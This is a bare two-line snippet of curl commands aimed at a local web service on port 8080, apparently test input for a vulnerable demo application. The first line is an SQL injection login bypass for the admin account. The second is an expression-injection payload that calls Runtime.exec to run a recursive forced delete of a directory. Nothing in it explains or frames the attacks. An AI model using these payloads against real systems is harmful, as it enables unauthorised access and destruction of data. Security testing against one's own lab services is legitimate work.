sudo curl -X POST -F "name=admin" -F "password=1' OR '1'='1'" localhost:8080
sudo curl -X POST -F "expression=@Runtime@getRuntime().exec('rm -fr /your-important-dir/')" localhost:8080